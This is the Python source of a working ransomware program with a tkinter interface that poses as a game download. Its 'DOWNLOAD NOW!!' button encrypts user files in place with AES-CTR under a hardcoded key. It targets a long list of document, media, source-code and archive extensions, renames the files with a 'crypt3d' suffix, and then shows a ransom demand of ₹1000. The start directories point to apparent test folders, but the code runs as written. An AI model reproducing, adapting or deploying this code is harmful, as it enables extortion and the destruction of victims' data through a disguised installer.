from Crypto.Cipher import AES
from Crypto.Util import Counter
from random import random
import tkinter as tk
from tkinter import font as tkfont
import sys
import os


HARDCODED_KEY = 'gimme some money'
ENCRYPTED_EXTENSION = 'crypt3d'
ENVIRONMENT_KEY = 'GAME_DOWNLOADED'
FLAG_FILE = os.path.join(os.environ['HOME'], '.cryptdone')

   
def get_crypt_status():
    try:
        with open(FLAG_FILE, 'r') as f:
            return f.read(1) == "1"
    except FileNotFoundError:
        return False

def set_crypt_status(status):
    with open(FLAG_FILE, 'w') as f:
        f.write("1" if status else "0")


class SampleApp(tk.Tk):

    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)

        self.title_font = tkfont.Font(family='Helvetica', size=18, weight="bold", slant="italic")

        # the container is where we'll stack a bunch of frames
        # on top of each other, then the one we want visible
        # will be raised above the others
        container = tk.Frame(self)
        container.pack(side="top", fill="both", expand=True)
        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)
        self.geometry("800x200")

        self.frames = {}
        for F in (StartPage, PageOne):
            page_name = F.__name__
            frame = F(parent=container, controller=self)
            self.frames[page_name] = frame

            # put all of the pages in the same location;
            # the one on the top of the stacking order
            # will be the one that is visible.
            frame.grid(row=0, column=0, sticky="nsew")
        self.show_frame("PageOne" if get_crypt_status() else "StartPage")

    def show_frame(self, page_name):
        frame = self.frames[page_name]
        frame.tkraise()


class StartPage(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        label = tk.Label(self, text="Click on 'DOWNLOAD NOW' to download the game!", font=controller.title_font)
        label.pack(side="top", fill="x", pady=10)

        button1 = tk.Button(self, text="DOWNLOAD NOW!!", command=self.handleEncrypt)

        button1.pack()
    
    def handleEncrypt(self):
        main(False)
        self.controller.show_frame("PageOne")
    

class PageOne(tk.Frame):

    def __init__(self, parent, controller):
        
        tk.Frame.__init__(self, parent)
        self.controller = controller

        label = tk.Label(self, text="Your files have been encrypted. Pay ₹1000 to unlock.", font=controller.title_font)
        label.pack(side="top", fill="x", pady=10)

        label1 = tk.Label(self, text="Enter the key: ", font=("ariel", 12, "bold")).place(x=10,y=50)

        key = tk.StringVar()
        entry_box = tk.Entry(self, textvariable=key, width=25, bg="lightgreen").place(x=200, y=50)        
        

        button = tk.Button(self, text="DECRYPT",command=lambda: self.handleDecrypt(key.get())).place(x=200,y=100)
    
    def handleDecrypt(self, key):
        if key == HARDCODED_KEY:
            main(True)
            # self.controller.show_frame("StartPage")
            sys.exit()


def discoverFiles(startpath, decrypt):
    if decrypt:
        extensions = [ENCRYPTED_EXTENSION]
    else:
        extensions = [
            # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # images
            'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies

            'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
            # OpenOffice, Adobe, Latex, Markdown, etc
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
            'yml', 'yaml', 'json', 'xml', 'csv',  # structured data
            'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images

            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
            'java', 'class', 'jar',  # java source code
            'ps', 'bat', 'vb',  # windows based scripts
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
            'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files

            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
        ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


def modifyFile(filename, crypto, decrypt, blocksize=16):
    with open(filename, 'r+b') as f:
        plaintext = f.read(blocksize)

        while plaintext:
            ciphertext = crypto(plaintext)
            if len(plaintext) != len(ciphertext):
                raise ValueError('''Ciphertext({})is not of the same length of the Plaintext({}).
                Not a stream cipher.'''.format(len(ciphertext), len(plaintext)))

            f.seek(-len(plaintext), 1)
            f.write(ciphertext)

            plaintext = f.read(blocksize)

    if decrypt and filename.endswith(ENCRYPTED_EXTENSION):
        os.rename(filename, filename[:-len(ENCRYPTED_EXTENSION)-1])
    else:
        os.rename(filename, filename + '.' + ENCRYPTED_EXTENSION)


def main(decrypt=False):
    if decrypt:
        set_crypt_status(False)
        key = HARDCODED_KEY

    else:
        set_crypt_status(True)
        if HARDCODED_KEY:
            key = HARDCODED_KEY

        # else:
        #     key = random(32)

    ctr = Counter.new(128)
    crypt = AES.new(key.encode("utf8"), AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = ['/media/sh0ck/Data/Projects/ransomware/testing', '/media/sh0ck/Data/Projects/ransomware/test_files']

    for currentDir in startdirs:
        for file in discoverFiles(currentDir, decrypt):
            modifyFile(file, crypt.encrypt, decrypt)

    if not decrypt:
        pass


if __name__ == "__main__":
    app = SampleApp()

    app.mainloop()

